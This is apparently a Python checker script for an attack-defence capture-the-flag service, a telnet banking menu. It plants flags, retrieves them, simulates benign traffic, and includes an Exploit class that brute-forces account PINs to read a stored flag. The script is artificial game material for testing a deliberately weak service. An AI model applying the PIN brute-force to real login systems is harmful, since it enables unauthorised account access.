import logging
l = logging.getLogger('stockjobber')
l.setLevel('DEBUG')

###########
## WORDS ##
###########

import string

FLAG_POSSIBILITIES = string.ascii_uppercase + string.digits + string.ascii_lowercase
words = [ line.strip() for line in open('/usr/share/dict/words').readlines() if len(line.strip()) < 10 and len(set(line.strip()) - set(FLAG_POSSIBILITIES)) == 0 ]
l.debug("THERE ... ARE ... %d ... WORDS", len(words))

def random_word():
	#FLAG_POSSIBILITIES = string.ascii_uppercase + string.digits + string.ascii_lowercase
	#return ''.join(random.choice(FLAG_POSSIBILITIES) for x in range(random.randint(1,9)))
	return random.sample(words, 1)[0].strip()[:9]

def random_pin():
	return str(random.randint(0, 9999))

def random_secret():
	new_flag = ''.join(random.choice(FLAG_POSSIBILITIES) for x in range(13))
	return "FLG" + new_flag

#############
## TRAFFIC ##
#############
import random
import telnetlib

class StockError(Exception):
	pass

class SJ(object):
	def __init__(self, host, port):
		self.c = telnetlib.Telnet(host, port=port, timeout=5)
		self.c.read_until("actions:")

	#def reset(self):
	#	l.debug("RESET")
	#	self.c.write("01\n")
	#	self.c.read_until("continue")
	#	self.c.write("\n")

	def menu_action(self, action):
		menu = self.c.read_until(action)
		num = menu.split('\n')[-1].split(')')[0]

		self.c.read_until('choice:')
		self.c.write(str(num) + '\n')
		return self

	def register_bank(self, bank, cfo, pin):
		l.debug("REG_BANK %s", ((bank, cfo, pin),))

		self.menu_action("Register bank")
		self.c.read_until("bank name:\n")
		self.c.write(bank+"\n")

		response = self.c.read_until('\n')
		if "registered!" in response:
			raise StockError('bank already registered')

		self.c.write(cfo+"\n")
		self.c.read_until("PIN")
		self.c.write(pin+"\n")
		print self.c.read_until("Added")
		self.c.read_until("continue")
		self.c.write("\n")

		return self

	def register_user(self, bank, uid, pin, lvl):
		l.debug("REGISTER %s", ((bank, uid, pin, lvl),))

		self.menu_action("Open account")
		self.c.read_until("with?")
		self.c.write(bank+"\n")
		self.c.read_until("username:")
		self.c.write(uid+"\n")
		self.c.read_until("PIN")
		self.c.write(pin+"\n")
		self.c.read_until("level:")
		self.c.write(str(lvl)+"\n")
		self.c.read_until("continue.")
		self.c.write("\n")

		return self

	def login(self, username, pin):
		l.debug("Login: %s", username)

		self.menu_action("Log in")
		self.c.read_until("username")
		self.c.write(username+"\n")
		self.c.read_until("PIN")
		self.c.write(str(pin)+"\n")
		self.c.read_until("Resulting access level: ")
		access = int(self.c.read_until('\n'))
		self.c.write("\n")
		return access

	def set_maiden_name(self, name):
		l.debug("Setting maiden name: %s", name)

		self.menu_action("Set mother's maiden name")
		self.c.read_until("Please enter")
		self.c.write(name+"\n")
		self.c.read_until("continue.")
		self.c.write("\n")

		return self

	def show_maiden_name(self):
		self.menu_action("Show mother's maiden name")
		self.c.read_until("maiden name is: ")
		name = self.c.read_until("\n").strip()
		self.c.read_until("continue")
		self.c.write("\n")

		return name

	def set_user_maiden_name(self, user, name):
		l.debug("Setting maiden name: %s", ((user,name),))

		self.menu_action("Set user's maiden name entry")
		self.c.read_until("username:")
		self.c.write(user+"\n")
		self.c.read_until("maiden name:")
		self.c.write(name+"\n")
		self.c.read_until("continue")
		self.c.write("\n")

		return self

	def list_users(self):
		self.menu_action("List users")
		self.c.read_until("granted.\n")
		text = self.c.read_until("Press any key to continue.")
		names = [ n.split()[1] for n in text.split('\n') ]
		self.c.write("\n")
		return names

	def quit(self):
		self.menu_action("Quit")

	def show_user_maiden_name(self, user):
		self.menu_action("Fetch user's maiden name entry")
		self.c.read_until("username")
		self.c.write(user+"\n")
		self.c.read_until("User's maiden name is: ")
		name = self.c.read_until("\n")
		self.c.read_until("continue")
		self.c.write("\n")
		return name

############
## SETTER ##
############
class SetFlag(): #pylint:disable=no-init
	def execute(self, ip, port, flag):
		#pylint:disable=attribute-defined-outside-init
		self.error = -1
		self.error_msg = 'Unable to connect'

		sj = SJ(ip, port)
		self.error = 2
		self.error_msg = "About to create company"

		bank = random_word()
		cfo = random_word()
		pin = random_pin()
		sj.register_bank(bank, cfo, pin)

		sj.login(cfo, pin)

		# register a random number of employees
		employees = [ (random_word(), random_pin()) for _ in range(0, random.randint(0, 5)) ]
		for u,p in employees:
			sj.register_user(bank, u, p, 1)

		# and some customers
		customers = [ (random_word(), random_pin()) for _ in range(0, random.randint(0, 10)) ]
		for u,p in customers:
			sj.register_user(bank, u, p, 0)

		maiden_names = [ random_secret() for _ in customers+employees ] + [ flag ]
		random.shuffle(maiden_names)

		for (u,p),maiden_name in zip(customers+employees+[(cfo,pin)], maiden_names):
			if maiden_name == flag:
				self.flag_id = u
				self.token = p
			sj.set_user_maiden_name(u, maiden_name)

		self.error = 0
		self.error_msg = "all set!"

		return sj

	def result(self):
		return {
			'FLAG_ID' : self.flag_id,
			'TOKEN' : self.token,
			'ERROR' : self.error,
			'ERROR_MSG' : self.error_msg,
		}


############
## GETTER ##
############
class GetFlag(): #pylint:disable=no-init
	def execute(self, ip, port, flag_id, cookie):
		#pylint:disable=attribute-defined-outside-init
		self.error = -1
		self.error_msg = 'Unable to connect'

		sj = SJ(ip, port)
		self.error = 2

		self.error_msg = "About to log in"
		sj.login(flag_id, cookie)

		self.error_msg = "About to get maiden name"
		self.flag = sj.show_maiden_name()
		self.error = 0
		self.error_msg = "ALL GOOD!"

	def result(self):
		return {
			'FLAG' : self.flag,
			'ERROR' : self.error,
			'ERROR_MSG' : self.error_msg,
		}


############
## BETTER ##
############
class Benign(): #pylint:disable=no-init
	def execute(self, ip, port, flag_id, token):
		#pylint:disable=attribute-defined-outside-init

		self.error = -1
		self.error_msg = 'Connection failed'

		sj = SJ(ip, port)

		if flag_id == "" or token == "":
			self.error = 0
			self.error_msg = "bengign called before set_flag"
			return

		self.error = 2
		self.error_msg = "logging in"
		access = sj.login(flag_id, token)

		if access == 0:
			l.debug("MD: %s", sj.show_maiden_name())
		elif access == 1:
			print "EMPLOYEE"
		elif access == 2:
			names = sj.list_users()
			for n in names:
				l.debug("CFO got %s for %s", sj.show_user_maiden_name(n).strip(), n)
		else:
			print "WTF", access

		sj.show_maiden_name()
		self.error = 0
		self.error_msg = "all good!"

	def result(self):
		return {
			'ERROR' : self.error,
			'ERROR_MSG' : self.error_msg,
		}



#############
## EXPLOIT ##
#############
class Exploit(): #pylint:disable=no-init
	def execute(self, ip, port, flag_id):
		#pylint:disable=attribute-defined-outside-init
		sj = SJ(ip, port)

		for i in range(100):
			access = sj.login(flag_id, i)
			if access == -1:
				l.debug("login failed with pin %s", i)
				continue
			else:
				break
		else:
			l.debug("FAIL")
			return

		self.flag = sj.show_maiden_name()

	def result(self):
		return {
			'FLAG': self.flag,
			'ERROR': 0,
			'ERROR_MSG': ""
		}

def test(t):
	s = SetFlag()
	g = GetFlag()
	b = Benign()
	e = Exploit()

	flg = "FLGAasefaAdfSijL"
	l.debug("SETTING")
	s.execute(t, 2583, flg) #.c.interact()

	l.debug("BENIGN")
	b.execute(t, 2583, s.flag_id, s.token)

	l.debug("GETTING")
	g.execute(t, 2583, s.flag_id, s.token)
	assert g.flag == flg

	l.debug("EXPLOIT")
	e.execute(t, 2583, s.flag_id)
	assert e.flag == flg

if __name__ == "__main__":
    import sys
    test(sys.argv[1])

